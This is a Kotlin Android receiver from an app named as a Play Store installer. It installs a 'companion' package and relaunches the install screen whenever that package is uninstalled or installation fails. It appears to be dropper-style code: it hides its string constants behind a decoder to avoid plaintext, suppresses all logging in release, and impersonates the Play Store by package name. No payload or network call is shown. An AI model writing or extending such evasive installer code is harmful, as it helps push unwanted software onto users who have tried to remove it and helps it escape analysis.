package com.playstore.installer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build

class InstallReceiver : BroadcastReceiver() {

    companion object {
        // Delegated to StringPool — no plaintext constants here
        val PREFS_NAME        get() = StringPool.d(StringPool.PREFS_NAME)
        val KEY_COMPANION_PKG get() = StringPool.d(StringPool.KEY_COMPANION_PKG)
    }

    override fun onReceive(context: Context, intent: Intent) {

        // Companion app was uninstalled — go back to Install UI immediately
        if (intent.action == Intent.ACTION_PACKAGE_REMOVED) {
            val uninstalledPkg = intent.data?.schemeSpecificPart ?: return
            val savedPkg = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getString(KEY_COMPANION_PKG, null)
            if (uninstalledPkg == savedPkg) {
                context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .edit()
                    .remove("install_stage")
                    .apply()
                val launch = Intent(context, InstallActivity::class.java)
                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                context.startActivity(launch)
            }
            return
        }

        val status = intent.getIntExtra(
            PackageInstaller.EXTRA_STATUS,
            PackageInstaller.STATUS_FAILURE
        )

        when (status) {

            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                val userIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(Intent.EXTRA_INTENT)
                }
                userIntent?.let {
                    it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(it)
                }
            }

            PackageInstaller.STATUS_SUCCESS -> {
                try {
                    val pkgName = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
                    if (!pkgName.isNullOrEmpty()) {
                        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                            .edit()
                            .putString(KEY_COMPANION_PKG, pkgName)
                            .apply()
                    }
                    // Notify InstallActivity to transition to DONE
                    val doneIntent = Intent(InstallActivity.INSTALL_SUCCESS_ACTION)
                    doneIntent.setPackage(context.packageName)
                    context.sendBroadcast(doneIntent)
                } catch (e: Exception) {
                    // Silent fail — no log output in release
                }
            }

            PackageInstaller.STATUS_FAILURE,
            PackageInstaller.STATUS_FAILURE_ABORTED,
            PackageInstaller.STATUS_FAILURE_BLOCKED,
            PackageInstaller.STATUS_FAILURE_CONFLICT,
            PackageInstaller.STATUS_FAILURE_INCOMPATIBLE,
            PackageInstaller.STATUS_FAILURE_INVALID,
            PackageInstaller.STATUS_FAILURE_STORAGE -> {
                val restart = Intent(context, InstallActivity::class.java)
                restart.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(restart)
            }
        }
    }
}
